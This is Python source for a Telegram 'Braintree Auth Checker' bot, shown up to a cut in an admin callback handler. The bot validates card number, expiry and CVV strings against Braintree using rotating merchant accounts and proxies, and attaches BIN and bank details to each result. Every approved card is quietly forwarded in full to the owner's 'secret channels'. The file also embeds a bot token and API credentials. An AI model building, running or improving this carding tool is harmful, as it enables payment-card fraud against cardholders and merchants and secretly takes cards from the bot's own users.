# ═══════════════════════════════════════════════════════════
#  Braintree Auth Bot - V1 Final (with Secret Channels)
# ═══════════════════════════════════════════════════════════

from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError, ChatAdminRequiredError, ChannelPrivateError
from telethon.tl.types import ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import aiofiles
import aiohttp
import os
import random
import time
import json
import re
import logging
from datetime import datetime
from typing import Optional, List

from braintree import check_card as bt_check_card

# ═══════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════
log = logging.getLogger("BraintreeBot")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setFormatter(_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('braintree_bot.log', encoding='utf-8')
    _fh.setFormatter(_fmt)
    log.addHandler(_fh)
except:
    pass


# ═══════════════════════════════════════════════════════════
#  PREMIUM EMOJI
# ═══════════════════════════════════════════════════════════
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "⏳": "5258113901106580375", "🚀": "4904936030232117798",
    "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738",
    "⭐": "5343636681473935403", "🆓": "5406756500108501710",
    "👑": "5303547611351902889", "⏱️": "5303243514782443814",
    "🆔": "5447311106030726740", "👤": "5445174334031166029",
    "💰": "5283232570660634549", "🔗": "5447479640547428304",
    "📌": "5447187153274567373", "🎉": "5172632227871196306",
    "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "⛔️": "5275969776668134187",
    "💬": "5447510826304959724", "🌍": "5303440357428586778",
    "🔐": "5258476306152038031", "🛡": "5042328396193864923",
    "🧠": "5040030395416969985", "🔵": "5258024802010026053",
    "📧": "5445174334031166029", "🗑": "5039614900280754969",
    "➕": "5042176294222037888", "🔄": "5454245266305604993",
    "📁": "5447408120752013199", "🏦": "5303159080020372094",
    "🔔": "5447187153274567373",
}


def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, eid in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>')
    return result


# ═══════════════════════════════════════════════════════════
#  BOLD SANS
# ═══════════════════════════════════════════════════════════
def bs(text):
    if not text: return text
    n_up = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    n_lo = "abcdefghijklmnopqrstuvwxyz"
    n_dg = "0123456789"
    b_up = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
    b_lo = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
    b_dg = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
    mp = {}
    for i, c in enumerate(n_up): mp[c] = b_up[i]
    for i, c in enumerate(n_lo): mp[c] = b_lo[i]
    for i, c in enumerate(n_dg): mp[c] = b_dg[i]
    return "".join(mp.get(c, c) for c in str(text))


# ═══════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════
API_ID = 37492640
API_HASH = "6cc6f53bea7276cd1394173608b86d69"
BOT_TOKEN = "8960684510:AAFQXVswk0eoxzmfko0VixgEI5cqwcwDIKw"

ADMIN_ID = [8527559335]

JOIN_CHANNEL_ID = -1004326984326
JOIN_CHANNEL_LINK = "https://t.me/eiirjfjjfjfjfjdjdj"
JOIN_GROUP_ID = -1004326984326
JOIN_GROUP_LINK = "https://t.me/eiirjfjjfjfjfjdjdj"

BOT_USERNAME = "hhhh_98bot"
BOT_URL = f"https://t.me/{BOT_USERNAME}"
OWNER_USERNAME = "VMV_U"
OWNER_URL = f"https://t.me/{OWNER_USERNAME}"

HIT_CHANNEL_ID = -1004326984326  # جروب الإشعارات (بدون كارت)
ALLOWED_GROUPS = [JOIN_GROUP_ID]

PRIVATE_DAILY_LIMIT = 30
COOLDOWN_SECONDS = 50
MBT_WORKERS = 5
ACCOUNT_USES_BEFORE_ROTATE = 5

# ═══ Files ═══
USERS_FILE = "users_data.json"
ACCOUNTS_FILE = "accounts_data.json"
PROXIES_FILE = "proxies_data.json"
CARDS_FILE = "cards_data.json"
CONFIG_FILE = "config_data.json"
ALLOWED_GROUPS_FILE = "allowed_groups.json"

# ═══ Caches ═══
_USERS = {}
_ACCOUNTS = {}
_PROXIES = {}
_CARDS = []
_CONFIG = {"switch": True, "secret_channels": []}

# ═══ Active ═══
ACTIVE_MBT = {}


# ═══════════════════════════════════════════════════════════
#  BIN INFO FETCHER
# ═══════════════════════════════════════════════════════════
_BIN_SESSION = None
_BIN_CACHE = {}


async def get_bin_info(card_number):
    global _BIN_SESSION
    prefix = card_number[:6]
    if prefix in _BIN_CACHE:
        return _BIN_CACHE[prefix]
    try:
        if _BIN_SESSION is None or _BIN_SESSION.closed:
            _BIN_SESSION = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=10)
            )
        async with _BIN_SESSION.get(f'https://bins.antipublic.cc/bins/{prefix}') as r:
            if r.status == 200:
                d = await r.json(content_type=None)
                info = {
                    "brand": d.get('brand', '-'),
                    "type": d.get('type', '-'),
                    "level": d.get('level', '-'),
                    "bank": d.get('bank', '-'),
                    "country": d.get('country_name', '-'),
                    "flag": d.get('country_flag', '🏳️'),
                }
                _BIN_CACHE[prefix] = info
                return info
    except:
        pass
    return {"brand": "-", "type": "-", "level": "-",
            "bank": "-", "country": "-", "flag": "🏳️"}


# ═══════════════════════════════════════════════════════════
#  JSON STORAGE
# ═══════════════════════════════════════════════════════════
async def _load_json(path, default):
    try:
        if not os.path.exists(path):
            async with aiofiles.open(path, "w", encoding="utf-8") as f:
                await f.write(json.dumps(default, ensure_ascii=False))
            return default
        async with aiofiles.open(path, "r", encoding="utf-8") as f:
            return json.loads(await f.read())
    except Exception as e:
        log.error(f"[LOAD {path}] {e}")
        return default


async def _save_json(path, data):
    try:
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, ensure_ascii=False, indent=2))
    except Exception as e:
        log.error(f"[SAVE {path}] {e}")


async def init_storage():
    global _USERS, _ACCOUNTS, _PROXIES, _CARDS, _CONFIG, ALLOWED_GROUPS
    _USERS = await _load_json(USERS_FILE, {})
    _ACCOUNTS = await _load_json(ACCOUNTS_FILE, {})
    _PROXIES = await _load_json(PROXIES_FILE, {})
    _CARDS = await _load_json(CARDS_FILE, [])
    _CONFIG = await _load_json(CONFIG_FILE, {"switch": True, "secret_channels": []})
    if "secret_channels" not in _CONFIG:
        _CONFIG["secret_channels"] = []
    ag = await _load_json(ALLOWED_GROUPS_FILE, {"groups": [JOIN_GROUP_ID]})
    ALLOWED_GROUPS = ag.get("groups", [JOIN_GROUP_ID])
    log.info(f"[STORAGE] Loaded ({len(_CONFIG.get('secret_channels', []))} secret channels)")


# ═══ USERS ═══
async def ensure_user(uid):
    uid_s = str(uid)
    if uid_s not in _USERS:
        _USERS[uid_s] = {
            "user_id": uid,
            "banned": False,
            "daily_used": 0,
            "daily_reset": datetime.now().strftime("%Y-%m-%d"),
            "last_check": 0,
            "joined_at": datetime.now().isoformat(),
        }
        await _save_json(USERS_FILE, _USERS)


async def is_banned(uid):
    if uid in ADMIN_ID: return False
    u = _USERS.get(str(uid))
    return u.get("banned", False) if u else False


async def get_daily_used(uid):
    u = _USERS.get(str(uid))
    if not u: return 0
    today = datetime.now().strftime("%Y-%m-%d")
    if u.get("daily_reset") != today:
        u["daily_used"] = 0
        u["daily_reset"] = today
        await _save_json(USERS_FILE, _USERS)
        return 0
    return u.get("daily_used", 0)


async def increment_daily(uid):
    uid_s = str(uid)
    if uid_s not in _USERS:
        await ensure_user(uid)
    today = datetime.now().strftime("%Y-%m-%d")
    _USERS[uid_s]["daily_used"] = _USERS[uid_s].get("daily_used", 0) + 1
    _USERS[uid_s]["daily_reset"] = today
    await _save_json(USERS_FILE, _USERS)


async def set_last_check(uid):
    uid_s = str(uid)
    if uid_s not in _USERS:
        await ensure_user(uid)
    _USERS[uid_s]["last_check"] = time.time()
    await _save_json(USERS_FILE, _USERS)


async def get_last_check(uid):
    u = _USERS.get(str(uid))
    return u.get("last_check", 0) if u else 0


# ═══ ACCOUNTS ═══
async def get_accounts():
    return list(_ACCOUNTS.values())


async def get_active_accounts():
    return [a for a in _ACCOUNTS.values()
            if not a.get("banned", False) and a.get("uses", 0) < ACCOUNT_USES_BEFORE_ROTATE]


async def add_account(email, password):
    _ACCOUNTS[email] = {
        "email": email, "password": password,
        "uses": 0, "last_used": 0, "banned": False,
        "added_at": datetime.now().isoformat(),
    }
    await _save_json(ACCOUNTS_FILE, _ACCOUNTS)
    return True


async def remove_account(email):
    if email in _ACCOUNTS:
        del _ACCOUNTS[email]
        await _save_json(ACCOUNTS_FILE, _ACCOUNTS)
        return True
    return False


async def mark_account_used(email):
    if email in _ACCOUNTS:
        _ACCOUNTS[email]["uses"] = _ACCOUNTS[email].get("uses", 0) + 1
        _ACCOUNTS[email]["last_used"] = time.time()
        await _save_json(ACCOUNTS_FILE, _ACCOUNTS)


async def get_random_account():
    actives = await get_active_accounts()
    if not actives:
        if not _ACCOUNTS: return None
        return min(_ACCOUNTS.values(), key=lambda a: a.get("last_used", 0))
    return random.choice(actives)


# ═══ PROXIES ═══
async def get_proxies():
    return list(_PROXIES.values())


async def add_proxy(proxy_url):
    _PROXIES[proxy_url] = {"proxy_url": proxy_url, "added_at": datetime.now().isoformat()}
    await _save_json(PROXIES_FILE, _PROXIES)
    return True


async def remove_proxy(proxy_url):
    if proxy_url in _PROXIES:
        del _PROXIES[proxy_url]
        await _save_json(PROXIES_FILE, _PROXIES)
        return True
    return False


async def get_random_proxy():
    if not _PROXIES: return None
    return random.choice(list(_PROXIES.values()))["proxy_url"]


# ═══ SWITCH ═══
async def get_switch():
    return _CONFIG.get("switch", True)


async def set_switch(enabled):
    _CONFIG["switch"] = enabled
    await _save_json(CONFIG_FILE, _CONFIG)
    return True


# ═══ SECRET CHANNELS ═══
async def get_secret_channels():
    return _CONFIG.get("secret_channels", [])


async def add_secret_channel(cid):
    chans = _CONFIG.get("secret_channels", [])
    if cid in chans:
        return False, "Already exists"
    chans.append(cid)
    _CONFIG["secret_channels"] = chans
    await _save_json(CONFIG_FILE, _CONFIG)
    return True, "Added"


async def remove_secret_channel(cid):
    chans = _CONFIG.get("secret_channels", [])
    if cid not in chans:
        return False, "Not found"
    chans.remove(cid)
    _CONFIG["secret_channels"] = chans
    await _save_json(CONFIG_FILE, _CONFIG)
    return True, "Removed"


# ═══ CARDS ═══
async def save_card(card, status, response, gateway="Braintree"):
    _CARDS.append({
        "card": card, "status": status, "response": response,
        "gateway": gateway, "checked_at": datetime.now().isoformat(),
    })
    if len(_CARDS) > 1000:
        _CARDS[:] = _CARDS[-1000:]
    await _save_json(CARDS_FILE, _CARDS)


async def get_stats():
    total = len(_CARDS)
    approved = sum(1 for c in _CARDS if c.get("status") == "APPROVED")
    declined = sum(1 for c in _CARDS if c.get("status") == "DECLINED")
    users = len(_USERS)
    accounts = len(_ACCOUNTS)
    active = len(await get_active_accounts())
    return {"total": total, "approved": approved, "declined": declined,
            "users": users, "accounts": accounts, "active_accounts": active}


# ═══ ALLOWED GROUPS ═══
def is_group_allowed(chat_id):
    return chat_id in ALLOWED_GROUPS


# ═══════════════════════════════════════════════════════════
#  CLIENT
# ═══════════════════════════════════════════════════════════
client = TelegramClient('braintree_bot', API_ID, API_HASH)
client_instance = client


# ═══════════════════════════════════════════════════════════
#  FORCE JOIN
# ═══════════════════════════════════════════════════════════
_JOIN_CACHE = {}


async def is_user_joined(uid):
    if uid in ADMIN_ID: return True
    now = time.time()
    c = _JOIN_CACHE.get(uid)
    if c and now - c < 600: return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client(GetParticipantRequest(channel=cid, participant=uid))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except UserNotParticipantError:
            return False
        except (ChatAdminRequiredError, ChannelPrivateError):
            pass
        except:
            pass
    _JOIN_CACHE[uid] = now
    return True


# ═══════════════════════════════════════════════════════════
#  MESSAGE HELPERS
# ═══════════════════════════════════════════════════════════
def pbtn(text, data=None, url=None, style=None):
    try:
        if url:
            return Button.url(text, url, style=style) if style else Button.url(text, url)
        if data:
            d = data.encode() if isinstance(data, str) else data
            return Button.inline(text, d, style=style) if style else Button.inline(text, d)
        return Button.inline(text, b"none")
    except TypeError:
        if url: return Button.url(text, url)
        if data:
            d = data.encode() if isinstance(data, str) else data
            return Button.inline(text, d)
        return Button.inline(text, b"none")


async def styled_reply(event, html_text, buttons=None, file=None):
    try:
        converted = premium_emoji(html_text)
        return await asyncio.wait_for(
            event.reply(converted, parse_mode='html', buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except asyncio.TimeoutError:
        return None
    except Exception as e:
        log.error(f"[styled_reply] {e}")
        return None


async def styled_send(chat_id, html_text, buttons=None, file=None):
    try:
        converted = premium_emoji(html_text)
        return await asyncio.wait_for(
            client.send_message(chat_id, converted, parse_mode='html', buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except Exception as e:
        log.error(f"[styled_send] {e}")
        return None


async def styled_edit(msg, html_text, buttons=None):
    try:
        converted = premium_emoji(html_text)
        await asyncio.wait_for(
            msg.edit(converted, parse_mode='html', buttons=buttons, link_preview=False),
            timeout=8
        )
    except:
        pass


# ═══════════════════════════════════════════════════════════
#  UTILS
# ═══════════════════════════════════════════════════════════
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_card(card):
    p = card.split('|')
    if len(p) != 4: return False
    if not (15 <= len(p[0]) <= 16): return False
    if len(p[1]) != 2: return False
    if len(p[2]) != 4: return False
    if not (3 <= len(p[3]) <= 4): return False
    return True


# ═══════════════════════════════════════════════════════════
#  CHECK FUNC
# ═══════════════════════════════════════════════════════════
async def do_single_check(uid, card):
    acc = await get_random_account()
    if not acc:
        return None, "No accounts configured"
    proxy = await get_random_proxy()
    t0 = time.time()
    try:
        res = await bt_check_card(card, acc["email"], acc["password"], proxy=proxy)
        res["elapsed"] = time.time() - t0
        res["account_used"] = acc["email"]
        await mark_account_used(acc["email"])
        return res, None
    except Exception as e:
        return None, str(e)


# ═══════════════════════════════════════════════════════════
#  CARD RESULT FORMAT
# ═══════════════════════════════════════════════════════════
def format_bt_result(status, card, response, elapsed, bin_info=None):
    if status == "Approved":
        header = f"<b>{bs('APPROVED')} ⭐</b>"
    elif status == "Declined":
        header = f"<b>{bs('DECLINED')} ❌</b>"
    else:
        header = f"<b>{bs('ERROR')} ⚠️</b>"

    bi = bin_info or {"brand": "-", "type": "-", "level": "-",
                      "bank": "-", "country": "-", "flag": "🏳️"}

    return f"""{header}
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
⤷ <code>{card}</code>
🛒 <b>{bs('Gateway')}</b> ━ <code>Braintree Auth</code>
📝 <b>{bs('Response')}</b> ━ <code>{response[:150]}</code>
<b>━━━━━━━━━━━━━━━━━</b>
🆔 <b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
🌍 <b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

⏱️ <b>{bs('Took')}</b> <code>{elapsed:.2f}s</code>"""


# ═══════════════════════════════════════════════════════════
#  HIT NOTIFICATIONS — 3 أماكن
# ═══════════════════════════════════════════════════════════
async def send_secret_hits(user_id, username, name, card, response, elapsed, bin_info=None):
    """HIT للقنوات السرية (مع كارت)"""
    try:
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={user_id}"
        user_link = f'<a href="{prof}">{name}</a>'

        bi = bin_info or {"brand": "-", "type": "-", "level": "-",
                          "bank": "-", "country": "-", "flag": "🏳️"}

        msg = f"""<b>{bs('APPROVED')} ⭐</b>
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
⤷ <code>{card}</code>
🛒 <b>{bs('Gateway')}</b> ━ <code>Braintree Auth</code>
📝 <b>{bs('Response')}</b> ━ <code>{response[:150]}</code>
<b>━━━━━━━━━━━━━━━━━</b>
🆔 <b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
🌍 <b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

⏱️ <b>{bs('Took')}</b> <code>{elapsed:.2f}s</code>
👤 <b>{bs('User')}:</b> {user_link}"""

        for cid in _CONFIG.get("secret_channels", []):
            try:
                await styled_send(cid, msg)
            except Exception as e:
                log.error(f"[HIT SECRET] {cid}: {e}")
    except Exception as e:
        log.error(f"[send_secret_hits] {e}")


async def send_group_hit(user_id, username, name, card, response):
    """HIT لجروب الإشعارات (بدون كارت)"""
    try:
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={user_id}"
        user_link = f'<a href="{prof}">{name}</a>'

        msg = f"""🔥 <b>{bs('HIT')} ➛ {bs('APPROVED')}</b>
🌐 <b>{bs('Gateway')} ➛ Braintree Auth</b>
💎 <b>{bs('Response')} ➛ <code>{response[:100]}</code></b>
👤 <b>{bs('User')} ➛ {user_link}</b>"""

        try:
            await styled_send(HIT_CHANNEL_ID, msg)
        except Exception as e:
            log.error(f"[HIT GROUP] {e}")
    except Exception as e:
        log.error(f"[send_group_hit] {e}")
      # ═══════════════════════════════════════════════════════════
#  /start
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help|cmds)$'))
async def start_cmd(event):
    uid = event.sender_id
    await ensure_user(uid)

    if await is_banned(uid):
        return await styled_reply(event,
            f"🚫 <b>{bs('You Are Banned')}</b>\n📌 <b>Contact:</b> {OWNER_URL}")

    if not await is_user_joined(uid):
        buttons = [
            [pbtn(f"🟢 {bs('Join Channel')}", url=JOIN_CHANNEL_LINK, style="primary")],
            [pbtn(f"🟢 {bs('Join Group')}", url=JOIN_GROUP_LINK, style="success")],
            [pbtn(f"🔴 {bs('I Joined')}", data="check_join", style="danger")],
        ]
        return await styled_reply(event,
            f"""👋 <b>{bs('Welcome')}!</b>
<b>━━━━━━━━━━━━━━━━━</b>
📌 <b>{bs('You Must Join')}:</b>
🔹 <b>{bs('Channel')}</b>
🔹 <b>{bs('Group')}</b>
<b>━━━━━━━━━━━━━━━━━</b>""",
            buttons=buttons)

    try:
        sender = await event.get_sender()
        name = sender.first_name or sender.username or "User"
    except:
        name = "User"

    switch = await get_switch()
    is_admin = uid in ADMIN_ID
    used = await get_daily_used(uid)
    limit_text = "∞" if is_admin else f"{used}/{PRIVATE_DAILY_LIMIT}"

    text = f"""👋 <b>{bs('Hey')}</b> <a href="tg://user?id={uid}">{name}</a>!

🛒 <b>{bs('Braintree Auth Checker')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
💳 <code>/bt</code> ━ <b>{bs('Single CC Check')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📊 <b>{bs('Daily Limit')}:</b> <code>{limit_text}</code>
🌐 <b>{bs('Gateway')}:</b> <b>Braintree Auth</b>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [pbtn(f"💬 {bs('Support')}", url=OWNER_URL, style="success")],
        [pbtn(f"📢 {bs('Channel')}", url=JOIN_CHANNEL_LINK, style="primary"),
         pbtn(f"👥 {bs('Group')}", url=JOIN_GROUP_LINK, style="primary")],
    ]
    await styled_reply(event, text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"check_join"))
async def check_join_cb(event):
    uid = event.sender_id
    if await is_user_joined(uid):
        _JOIN_CACHE[uid] = time.time()
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
    else:
        await event.answer(f"❌ {bs('Not Joined Yet')}!", alert=True)


# ═══════════════════════════════════════════════════════════
#  /bt
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(pattern=r'(?i)^[/.]bt\b'))
async def bt_cmd(event):
    uid = event.sender_id
    await ensure_user(uid)

    if await is_banned(uid):
        return await styled_reply(event, f"🚫 <b>{bs('Banned')}</b>")

    if not await is_user_joined(uid):
        return await styled_reply(event, f"❌ <b>{bs('Join the channel/group first')}</b>")

    is_admin = uid in ADMIN_ID

    if not is_admin and not await get_switch():
        return await styled_reply(event,
            f"""🔴 <b>{bs('Checking Disabled')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
⛔️ <b>{bs('Checking is currently disabled by owner')}</b>
📌 <b>{bs('Contact')}:</b> {OWNER_URL}
<b>━━━━━━━━━━━━━━━━━</b>""")

    is_private = event.chat_id == uid
    if is_private and not is_admin:
        used = await get_daily_used(uid)
        if used >= PRIVATE_DAILY_LIMIT:
            return await styled_reply(event,
                f"""⏳ <b>{bs('Daily Limit Reached')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📊 <b>{bs('Used')}:</b> <code>{used}/{PRIVATE_DAILY_LIMIT}</code>
💡 <b>{bs('Check in the group (no limit)')}</b>
<b>━━━━━━━━━━━━━━━━━</b>👇""",
                buttons=[[pbtn(f"👥 {bs('Check in Group')}", url=JOIN_GROUP_LINK, style="success")]])

    # Cooldown 50s (على الكل)
    last = await get_last_check(uid)
    elapsed_cd = time.time() - last
    if elapsed_cd < COOLDOWN_SECONDS:
        remaining = int(COOLDOWN_SECONDS - elapsed_cd)
        return await styled_reply(event,
            f"""⏱️ <b>{bs('Wait Please')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
🔄 <b>{bs('Next check in')}:</b> <code>{remaining}s</code>
<b>━━━━━━━━━━━━━━━━━</b>""")

    text = event.raw_text
    reply_text = ""
    if event.reply_to_msg_id:
        try:
            rm = await event.get_reply_message()
            reply_text = rm.text or ""
        except:
            pass

    cards = extract_cc(text) + extract_cc(reply_text)
    if not cards:
        return await styled_reply(event,
            f"💳 <b>{bs('Usage')}:</b>\n<code>/bt 4111111111111111|12|2026|123</code>")

    card = cards[0]
    if not is_valid_card(card):
        return await styled_reply(event, f"❌ <b>{bs('Invalid card format')}</b>")

    loading = await styled_reply(event, f"⏳ <b>{bs('Checking')}...</b>")
    res, err = await do_single_check(uid, card)

    if err:
        try: await loading.delete()
        except: pass
        return await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{err[:150]}</code>")

    await set_last_check(uid)
    if is_private and not is_admin:
        await increment_daily(uid)

    status = res.get("status", "Error")
    response_text = res.get("response", "-")
    elapsed = res.get("elapsed", 0)

    asyncio.create_task(save_card(card, status.upper(), response_text))

    # جلب BIN
    bin_info = await get_bin_info(card.split('|')[0])

    # رسالة للمستخدم
    msg_text = format_bt_result(status, card, response_text, elapsed, bin_info)
    try: await loading.delete()
    except: pass
    await styled_reply(event, msg_text)

    # لو Approved → ابعت للقنوات السرية + الجروب
    if status == "Approved":
        try:
            sender = await event.get_sender()
            uname = sender.username or f"user_{uid}"
            name = sender.first_name or "User"
            asyncio.create_task(send_secret_hits(uid, uname, name, card, response_text, elapsed, bin_info))
            asyncio.create_task(send_group_hit(uid, uname, name, card, response_text))
        except:
            pass


# ═══════════════════════════════════════════════════════════
#  /switch on|off
# ═══════════════════════════════════════════════════════════
@client.on(events.NewMessage(pattern=r'(?i)^[/.]switch\s+(on|off)$'))
async def switch_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return await styled_reply(event, f"🔴 <b>{bs('Owner Only')}</b>")

    arg = event.pattern_match.group(1).decode().lower()
    enabled = (arg == "on")
    await set_switch(enabled)

    if enabled:
        txt = f"""🟢 <b>{bs('Checking Enabled')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
✅ <b>{bs('Users can check now')}</b>
📌 <b>{bs('Status')}:</b> <code>ON</code>
<b>━━━━━━━━━━━━━━━━━</b>"""
    else:
        txt = f"""🔴 <b>{bs('Checking Disabled')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
⛔️ <b>{bs('Users cannot check now')}</b>
📌 <b>{bs('Status')}:</b> <code>OFF</code>
<b>━━━━━━━━━━━━━━━━━</b>"""
    await styled_reply(event, txt)


# ═══════════════════════════════════════════════════════════
#  /panel
# ═══════════════════════════════════════════════════════════
USER_STATE = {}


@client.on(events.NewMessage(pattern=r'(?i)^[/.]panel$'))
async def panel_cmd(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return await styled_reply(event, f"🔴 <b>{bs('Owner Only')}</b>")

    switch = await get_switch()
    accounts = await get_accounts()
    active_accounts = await get_active_accounts()
    proxies = await get_proxies()
    secret_chans = await get_secret_channels()
    stats = await get_stats()

    txt = f"""⚙️ <b>{bs('Owner Panel')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
🟢 <b>{bs('Switch')}:</b> <code>{'ON' if switch else 'OFF'}</code>
📧 <b>{bs('Accounts')}:</b> <code>{len(accounts)}</code> ({len(active_accounts)} active)
🔐 <b>{bs('Proxies')}:</b> <code>{len(proxies)}</code>
📢 <b>{bs('Secret Channels')}:</b> <code>{len(secret_chans)}</code>
<b>━━━━━━━━━━━━━━━━━</b>
📊 <b>{bs('Stats')}:</b>
├ 💳 <b>{bs('Total')}:</b> <code>{stats['total']}</code>
├ ✅ <b>{bs('Approved')}:</b> <code>{stats['approved']}</code>
├ ❌ <b>{bs('Declined')}:</b> <code>{stats['declined']}</code>
└ 👥 <b>{bs('Users')}:</b> <code>{stats['users']}</code>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [pbtn(f"🟢 {bs('Switch ON')}", "set_switch:on", style="success"),
         pbtn(f"🔴 {bs('Switch OFF')}", "set_switch:off", style="danger")],
        [pbtn(f"📧 {bs('Accounts')}", "show_accounts", style="primary"),
         pbtn(f"➕ {bs('Add Account')}", "add_account", style="success")],
        [pbtn(f"🗑 {bs('Remove Account')}", "remove_account", style="danger")],
        [pbtn(f"🔐 {bs('Proxies')}", "show_proxies", style="primary"),
         pbtn(f"➕ {bs('Add Proxy')}", "add_proxy", style="success")],
        [pbtn(f"🗑 {bs('Remove Proxy')}", "remove_proxy", style="danger")],
        [pbtn(f"📢 {bs('Secret Channels')}", "show_secret", style="primary")],
        [pbtn(f"➕ {bs('Add Secret Channel')}", "add_secret", style="success"),
         pbtn(f"🗑 {bs('Remove Secret')}", "remove_secret", style="danger")],
        [pbtn(f"🔄 {bs('Refresh')}", "refresh_stats", style="primary")],
    ]
    await styled_reply(event, txt, buttons=buttons)


@client.on(events.CallbackQuery(data=b"set_switch:on"))
async def cb_switch_on(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    await set_switch(True)
    await event.answer(f"🟢 {bs('Enabled')}", alert=True)


@client.on(events.CallbackQuery(data=b"set_switch:off"))
async def cb_switch_off(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    await set_switch(False)
    await event.answer(f"🔴 {bs('Disabled')}", alert=True)


@client.on(events.CallbackQuery(data=b"show_accounts"))
async def cb_show_accounts(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    accounts = await get_accounts()
    if not accounts:
        return await event.answer(f"{bs('No Accounts')}", alert=True)
    txt = f"📧 <b>{bs('Accounts')}:</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    for i, a in enumerate(accounts[:30], 1):
        uses = a.get("uses", 0)
        status = "🟢" if uses < ACCOUNT_USES_BEFORE_ROTATE else "🔴"
        txt += f"{status} <code>{i}.</code> <b>{a['email']}</b> ({uses}/{ACCOUNT_USES_BEFORE_ROTATE})\n"
    if len(accounts) > 30:
        txt += f"\n<i>+{len(accounts)-30} more</i>"
    await event.answer(f"{len(accounts)} accounts")
    try:
        await client.send_message(event.chat_id, premium_emoji(txt), parse_mode='html')
    except: pass


@client.on(events.CallbackQuery(data=b"add_account"))
async def cb_add_account(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    USER_STATE[event.sender_id] = {"action": "add_account"}
    try: await event.delete()
    except: pass
    await styled_send(event.chat_id,
        f"📧 <b>{bs('Add Account')}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>{bs('Send')}:</b> <code>email password</code>\n"
        f"<b>{bs('Or')}:</b> <code>cancel</code>")


@client.on(events.CallbackQuery(data=b"remove_account"))
async def cb_remove_account(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Owner only!", alert=True)
    accounts = await get_accounts()
    if not accounts:
        return await event.answer(f"{bs('No Accounts')}", alert=True)
    buttons = []
    for a in accounts[:10]:
